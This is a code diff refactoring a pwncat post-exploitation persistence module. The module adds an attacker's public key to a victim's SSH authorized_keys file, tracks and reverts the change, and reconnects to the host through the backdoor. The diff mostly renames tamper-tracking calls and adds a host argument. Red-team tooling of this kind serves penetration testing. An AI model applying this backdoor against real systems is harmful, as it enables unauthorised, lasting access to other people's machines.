@@ -72,9 +72,7 @@ class Module(PersistModule):
 
         # Ensure we read a public key
         if not pubkey:
-            raise PersistError(
-                f"{pwncat.config['privkey']+'.pub'}: empty public key"
-            )
+            raise PersistError(f"{pwncat.config['privkey']+'.pub'}: empty public key")
 
         # Add our public key
         authkeys.extend(pubkey)
@@ -104,7 +102,7 @@ class Module(PersistModule):
         )
 
         # Register the modifications with the tamper module
-        pwncat.victim.tamper.modified_file(
+        pwncat.tamper.modified_file(
             os.path.join(homedir, ".ssh", "authorized_keys"), added_lines=pubkey
         )
 
@@ -124,7 +122,7 @@ class Module(PersistModule):
             raise PersistError("no home directory")
 
         # Remove the tamper tracking
-        for tamper in pwncat.victim.tamper.filter(pwncat.tamper.ModifiedFile):
+        for tamper in pwncat.tamper.filter(pwncat.tamper.ModifiedFile):
             if (
                 tamper.path == os.path.join(homedir, ".ssh", "authorized_keys")
                 and tamper.added_lines == pubkey
@@ -135,7 +133,7 @@ class Module(PersistModule):
                 except pwncat.tamper.RevertFailed as exc:
                     raise PersistError(str(exc))
                 # Remove the tamper tracker
-                pwncat.victim.tamper.remove(tamper)
+                pwncat.tamper.remove(tamper)
                 break
         else:
             raise PersistError("failed to find matching tamper")
@@ -190,16 +188,18 @@ class Module(PersistModule):
             pwncat.victim.env(["rm", "-f", privkey_path])
         except FileNotFoundError:
             # File removal failed because `rm` doesn't exist. Register it as a tamper.
-            pwncat.victim.tamper.created_file(privkey_path)
+            pwncat.tamper.created_file(privkey_path)
 
         return True
 
-    def connect(self, user, backdoor_key: str) -> socket.SocketType:
+    def connect(
+        self, host: pwncat.db.Host, user, backdoor_key: str
+    ) -> socket.SocketType:
         """ Reconnect to this host with this persistence method """
 
         try:
             # Connect to the remote host's ssh server
-            sock = socket.create_connection((pwncat.victim.host.ip, 22))
+            sock = socket.create_connection((host.ip, 22))
         except Exception as exc:
             raise PersistError(str(exc))
 
